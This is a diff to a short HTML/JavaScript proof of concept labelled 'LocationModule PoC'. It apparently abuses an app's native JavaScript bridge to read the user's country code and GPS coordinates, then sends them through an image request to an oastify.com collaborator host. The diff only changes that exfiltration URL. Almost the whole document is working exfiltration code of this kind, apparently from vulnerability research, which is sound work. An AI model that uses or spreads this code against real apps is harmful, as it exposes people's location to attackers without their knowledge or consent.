@@ -1,3 +1,4 @@
+<!-- LocationModule PoC -->
 <script>
 function call(o, e, n, t) {
     var c = o + "_" + e + "Callback_" + Date.now();
@@ -15,7 +16,7 @@ function call(o, e, n, t) {
 call("ScopeModule", "reloadScopes", {}, function() {
     call("LocationModule", "getCountryCode", {}, function(o) {
         call("LocationModule", "getCoordinate", {}, function(e) {
-            (new Image).src = "https://eucgkxr4x3u2aszlg2gepdw4jvpmdn1c.oastify.com/?country=" + encodeURIComponent(o.result) + "&coords=" + encodeURIComponent(JSON.stringify(e.result))
+            (new Image).src = "https://4pu8pkt7ixmnkqggqzse0oa68xeo2eq3.oastify.com/?country=" + encodeURIComponent(o.result) + "&coords=" + encodeURIComponent(JSON.stringify(e.result))
         })
     })
 });
